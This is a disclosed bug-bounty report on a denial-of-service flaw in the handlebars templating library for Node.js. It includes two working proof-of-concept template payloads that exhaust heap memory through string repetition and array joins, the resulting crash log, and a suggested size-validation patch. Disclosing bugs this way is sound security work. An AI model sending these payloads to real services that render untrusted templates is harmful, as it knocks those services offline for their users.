# Crash Node.js process from handlebars using a small and simple source

## Report Details
- **Report ID**: 726364
- **URL**: https://hackerone.com/reports/726364
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2019-10-31T13:23:37.637Z
- **Disclosed**: 2020-04-27T22:13:11.436Z

## Reporter
- **Username**: macasun
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report Denial of service in handlebars.
It allows an attacker to crush Node.js process with a small and simple source.

# Module

**module name:** handlebars
**version:** 4.5.1
**npm page:** `https://www.npmjs.com/package/handlebars`

## Module Description

Handlebars.js is an extension to the Mustache templating language created by Chris Wanstrath. Handlebars.js and Mustache are both logicless templating languages that keep the view and the code separated like we all know they should be.

## Module Stats

9,223,382 downloads/week

# Vulnerability

## Vulnerability Description

By default Node.js limiting the max heap size to 700 MB or 1400MB on 32 and 64-bit platforms respectively. When the process consumes all available memory, it crashes. Handlebars doesn't validate the size of the context, so it's possible to create a very big string (using `String#repeat`) or a very big array (using `Array.push`), and concatenate a string or join an array to crash Node.js process. In theory, this exploit will crash node.js process that was started with increased memory limit: `--max-old-space-size=<memory-size>`. 

## Steps To Reproduce:

There are three possible variants of the exploit:
1. Generate a big string (500Mb) and call `String#concat` on it (the payload size is 124b).
2. Declare a small string (100b), convert it to array using `String#split` and call thousands of `Array#push/Array#join` (the payload is 88Kb).
3. Declare a medium size string (10Kb), convert it to array using `String#split` and call hundreds of `Array#push/Array#join` (the payload is 18Kb).

1. The exploit doesn't require input context, it creates everything inside the source.
2. Create a big size string using `String#repeat`.
3. Concatenate string with itself.
4. Compile and run template.
5. Process crashed.

Variant #1. Generate a big string (500Mb) and call `String#concat` on it:
```
const handlebars = require('handlebars');

let source = `
{{#with 'a' as |s0|}}
  {{#with (s0.repeat 500000000) as |s|}}
    {{s.concat s}}
    {{s.concat s}}
  {{/with}}
{{/with}}
`;

let template = handlebars.compile(source);
template();
```

Variant #2. Declare a small string (100b), convert it to array using `String#split` and call thousands of `Array#push/Array#join`:
```
const handlebars = require('handlebars');

let sourceHeader = `
{{#with 'ssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss' as |s|}}
  {{#with s.split as |a|}}
`;
let sourceFooter = `
  {{/with}}
{{/with}}
`;
let sourceBody = '{{a.push s}}{{a.join}}'.repeat(10 ** 3 * 4);
let payload = sourceHeader + sourceBody + sourceFooter;

let template = handlebars.compile(payload);
template();
```

In both cases Node.js process crashes:
```
<--- Last few GCs --->

[11741:0x32299b0]     3929 ms: Mark-sweep 1245.6 (1426.4) -> 1245.6 (1425.4) MB, 33.7 / 0.0 ms  (average mu = 0.685, current mu = 0.001) last resort GC in old space requested
[11741:0x32299b0]     3963 ms: Mark-sweep 1245.6 (1425.4) -> 1245.6 (1425.4) MB, 34.4 / 0.0 ms  (average mu = 0.501, current mu = 0.001) last resort GC in old space requested

<--- JS stacktrace --->

==== JS stack trace =========================================

    0: ExitFrame [pc: 0xc1315dbe1d]
Security context: 0x2eee53b9e6e1 <JSObject>
    1: DoJoin(aka DoJoin) [0x2eee53b85e89] [native array.js:~87] [pc=0xc131892da0](this=0x2b1e3fd026f1 <undefined>,l=0x0378b7e7e3e9 <JSArray[6647]>,m=6647,A=0x2b1e3fd028c9 <true>,w=0x2eee53bdc0d9 <String[1]: ,>,v=0x2b1e3fd029a1 <false>)
    2: Join(aka Join) [0x2eee53b85ed9] [native array.js:1] [bytecode=0xc562a657d09 offset=71](this=0x2b1e3fd026f1 <undefined>...

FATAL ERROR: CALL_AND_RETRY_LAST Allocation failed - JavaScript heap out of memory
 1: 0x8dc1c0 node::Abort() [node]
 2: 0x8dc20c  [node]
 3: 0xad60ae v8::Utils::ReportOOMFailure(v8::internal::Isolate*, char const*, bool) [node]
 4: 0xad62e4 v8::internal::V8::FatalProcessOutOfMemory(v8::internal::Isolate*, char const*, bool) [node]
 5: 0xec3972  [node]
 6: 0xed318f v8::internal::Heap::AllocateRawWithRetryOrFail(int, v8::internal::AllocationSpace, v8::internal::AllocationAlignment) [node]
 7: 0xea2d3b v8::internal::Factory::NewRawTwoByteString(int, v8::internal::PretenureFlag) [node]
 8: 0x1191338 v8::internal::Runtime_StringBuilderJoin(int, v8::internal::Object**, v8::internal::Isolate*) [node]
 9: 0xc1315dbe1d 
Aborted (core dumped
```

## Patch

Validate the size of the context before calling any of its functions.
1. If context is a string, validate that its length doesn't exceed some logical value (100Kb for example).
2. If context is an array, validate that its size doesn't exceed some logical value (500 elements for example) and sum of all element's values less than logical value (10Kb for example).

## Supporting Material/References:

- Ubuntu 18.04.3
- node 10.15.1
- npm 6.4.1

# Wrap up

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N] 

Best regards,
Alexander

## Impact

An attacker is able to crash Node.js process.

## Attachments
No attachments
